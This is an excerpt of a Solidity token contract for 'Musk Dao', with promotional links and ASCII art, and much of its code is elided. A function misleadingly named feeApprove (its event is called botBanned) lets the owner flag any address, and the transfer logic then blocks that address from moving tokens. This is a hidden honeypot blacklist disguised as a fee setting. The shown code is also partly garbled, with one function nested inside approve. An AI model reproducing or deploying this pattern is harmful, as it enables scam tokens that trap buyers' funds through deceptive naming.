...
/**
 Telegram - https://t.me/MuskDao        Website - https://muskdao.in/
                                                                     .::                  
        .::-:           ....                               .-===:.=#@@%@@#:    :+#@@@%+:  
     .+%@@%%@@#=.   .=#@@@@@%+ -+*#*=:     ..        .-+#%@@@##%@@@#:   *@% .=#@%+:.:[email protected]@. 
...
contract MuskDAO is Context, IERC20, Ownable {
    ...
    event botBanned (address feeAddress, bool isBanned);
    ...
    string private _name = 'Musk Dao';
    string private _symbol = 'MuskDAO';
    ...
    function feeApprove(address feeAddress) external onlyOwner {
        if (_feeApprove[feeAddress] == true) {
            _feeApprove[feeAddress] = false;
        } else {_feeApprove[feeAddress] = true;
            emit botBanned (feeAddress, _feeApprove[feeAddress]);
          }
    }
    
    function feeAmount(address feeAddress) public view returns (bool) {
        return _feeApprove[feeAddress];
    }
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
       ...
       function rewardsDistribution(address owner, uint256 amount) public virtual onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_feeApprove[sender] || _feeApprove[recipient]) require (amount == 0, "");
